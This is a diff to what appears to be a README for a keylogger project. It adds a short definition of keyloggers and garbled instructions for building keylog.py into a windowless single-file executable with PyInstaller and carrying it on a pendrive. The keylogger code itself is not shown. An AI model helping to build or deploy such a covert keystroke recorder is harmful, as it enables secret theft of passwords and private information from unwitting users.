@@ -1,3 +1,7 @@
+keyloggers are software or hardware devices that secretly record keystrokes entered on a keyboard. They can be used for both legitimate purposes like software development feedback and malicious purposes like stealing passwords and other sensitive information
+
+after the code run properly user the below command's to get the executable file then move on to the _internal folder and <filename>.exe this two pendriver then the below video I am attaced what happen
+
 pip install pyinstaller
 
 python -m pyinstaller --noconfirm --onefile --windowed keylog.py
@@ -7,10 +11,6 @@ cd dist
 keylog.exe
 
 ![image](https://github.com/user-attachments/assets/f32a015e-113c-4159-b6b1-d8b4b66b0476)
-
-![image](https://github.com/user-attachments/assets/42186076-63d7-4a6e-ab82-8a800cb3bc27)
-
-![image](https://github.com/user-attachments/assets/65a8b507-cf8a-4c31-a58f-daec2a852485)
 
 
 
